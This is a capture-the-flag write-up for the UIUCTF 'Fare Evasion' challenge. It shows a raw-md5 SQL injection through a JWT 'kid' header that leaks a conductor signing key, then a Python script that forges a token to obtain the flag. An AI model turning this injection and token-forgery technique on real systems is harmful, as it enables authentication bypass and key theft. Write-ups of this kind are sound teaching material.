# Fare Evasion
SIGPwny Transit Authority needs your fares, but the system is acting a tad odd. We'll let you sign your tickets this time!

## Writeup

```js
async function pay() {
      // i could not get sqlite to work on the frontend :(
      /*
        db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
        ???????
       */
      const r = await fetch("/pay", { method: "POST" });
      const j = await r.json();
      document.getElementById("alert").classList.add("opacity-100");
      // todo: convert md5 to hex string instead of latin1??
      document.getElementById("alert").innerText = j["message"];
      setTimeout(() => { document.getElementById("alert").classList.remove("opacity-100") }, 5000);
    }
```

```json
{"message":"Key isn't passenger or conductor. Please sign your own tickets. \nhashed _\bR\u00f2\u001es\u00dcx\u00c9\u00c4\u0002\u00c5\u00b4\u0012\\\u00e4 secret: a_boring_passenger_signing_key_?","success":false}
```

Send **md5** hash of **RòsÜxÉÄÅ´\ä** string and we will receive:

```json
{"message":"near \"\u00ef\u00deV3Z\u008f\": syntax error","success":false}
```

We need to construct an md5 that generate a sqli, we can try with this text:

```
DyrhGOYP0vxI2DtH8y
```

And in the output will appear the conductor key:

```json
{"message":"Sorry passenger, only conductors are allowed right now. Please sign your own tickets. \nhashed \u00f4\u008c\u00f7u\u009e\u00deIB\u0090\u0005\u0084\u009fB\u00e7\u00d9+ secret: conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e\nhashed _\bR\u00f2\u001es\u00dcx\u00c9\u00c4\u0002\u00c5\u00b4\u0012\\\u00e4 secret: a_boring_passenger_signing_key_?","success":false}
```

We can now use it to take the flag:

```python
#!/usr/bin/python3
import requests
import jwt
import hashlib

url = f'https://fare-evasion.chal.uiuc.tf'

def pay(s, encoded_jwt):
    req = s.post(url + '/pay', cookies = {'access_token': encoded_jwt})
    return req.text

if __name__ == '__main__':
    s = requests.Session()
    passenger_secret = "a_boring_passenger_signing_key_?"
    hashed = 'DyrhGOYP0vxI2DtH8y' # https://github.com/gen0cide/hasherbasher
    conductor_secret = 'conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e'
    
    secret = conductor_secret
    encoded_jwt = jwt.encode({'type': 'conductor'}, secret, algorithm="HS256", headers={'kid': hashed})

    print(pay(s, encoded_jwt))
```

The flag is:

```json
{"message":"Conductor override success. uiuctf{sigpwny_does_not_condone_turnstile_hopping!}","success":true}
```